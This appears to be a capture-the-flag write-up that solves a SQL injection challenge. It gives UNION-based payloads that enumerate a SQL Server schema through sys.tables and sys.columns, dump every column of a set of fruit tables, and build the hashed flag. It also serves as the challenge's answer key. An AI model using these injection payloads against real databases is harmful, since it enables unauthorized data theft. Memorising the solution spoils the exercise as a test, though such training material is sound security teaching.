# Make Your Selection 3

### Challenge

Start with solution from Make Your Selection 1:

    xyz' UNION ALL SELECT name FROM sys.tables; --

now find column names for each table

    xyz' UNION ALL SELECT name FROM sys.columns where object_id = (select object_id from sys.tables where name = 'Fruit'); --
    xyz' UNION ALL SELECT name FROM sys.columns where object_id = (select object_id from sys.tables where name = 'FruitColor'); --    
    ...etc.

Now that you know all the column names, start selecting each column from each table:

    xyz' UNION ALL SELECT Id FROM Fruit order by 1; --
    xyz' UNION ALL SELECT FruitName FROM Fruit order by 1; --
    xyz' UNION ALL SELECT FruitGrowsOnId FROM Fruit order by 1; --
    xyz' UNION ALL SELECT FruitColorId FROM Fruit order by 1; --
    ...etc.

When you have all values from all columns of all tables just put them together in order of table name then column name then value. Notice this table shows the tables in alphabetical order, then their columns in alphabetical order, then the values in alphabetical order.


| Fruit.FruitColorID | Fruit.FruitGrowsOnID | Fruit.FruitName | Fruit.Id | Fruit.SeasonID| FruitColor.Color | FruitColor.Id | FruitGrowsOn.Id | FruitGrowsOn.PlantType | FruitSeason.Id | FruitSeason.Season|
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
|123456|111234|AppleBananaBlueberryGrapeOrangeStrawberry|133334|123456|BlueGreenOrangePurpleRedYellow|123456|1234|BushrunnerTreeVine|1234|FallSpringSummerWinter|

All together it evaluates to 123456111234AppleBananaBlueberryGrapeOrangeStrawberry133334123456BlueGreenOrangePurpleRedYellow1234561234BushrunnerTreeVine1234FallSpringSummerWinter

Finally, compute the SHA256 hash of that value. Use an online tool or your favorite programming language.

```
select 'Fruit.Id', CAST(Id as nvarchar(10)) from dbo.Fruit
union all select 'Fruit.FruitName',  FruitName from dbo.Fruit
union all select 'Fruit.FruitGrowsOnID', CAST(FruitGrowsOnID as nvarchar(200)) from dbo.Fruit
union all select 'Fruit.FruitcolorID', CAST(FruitColorID as nvarchar(200)) from dbo.Fruit
union all select 'Fruit.FruitSeasonID', CAST(FruitSeasonID as nvarchar(200)) from dbo.Fruit
union all select 'FruitColor.Id', CAST(Id as nvarchar(10)) from dbo.FruitColor
union all select 'FruitColor.FruitColor', Color from dbo.FruitColor
union all select 'FruitGrowsOn.Id', CAST(Id as nvarchar(10)) from dbo.FruitGrowsOn
union all select 'FruitGrowsOn.PlantType', PlantType from dbo.FruitGrowsOn
union all select 'FruitSeason.Id', CAST(Id as nvarchar(10)) from dbo.FruitSeason
union all select 'FruitSeason.Season', Season from dbo.FruitSeason
ORDER BY 1,2;
```
